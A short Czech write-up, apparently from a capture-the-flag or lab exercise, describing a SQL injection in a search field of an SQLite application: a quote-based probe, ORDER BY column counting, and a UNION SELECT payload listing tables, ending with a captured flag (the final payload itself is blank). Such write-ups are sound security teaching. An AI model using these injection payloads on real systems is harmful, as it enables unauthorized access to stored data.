# Penetrační test – SQL Injection

**Autor:** KuRy4  
**Datum:** 31. 3. 2026

## Průzkum
Vložením `'` do vyhledávacího pole se objevila SQL chyba:  
„1st ORDER BY term out of range - should be between 1 and 2“.  

Tím byla potvrzena zranitelnost proti SQL Injection (SQLite databáze).

## Zjištění struktury
- Pomocí `ORDER BY` jsem zjistil, že původní dotaz má **2 sloupce**.
- Pomocí payloadu `' UNION SELECT 1, name FROM sqlite_master WHERE type='table' --` jsem našel tabulku `config`.

## Exfiltrace dat
Finálním payloadem jsem vyexfiltrovat obsah tabulky `config` a získal vlajku.

**Finální payload:**

**Získaná vlajka:** `FLAG{Sql_Un1on_M4st3r_S0SE}`

## Screenshot
![Vlajka v aplikaci](screenshot.png)

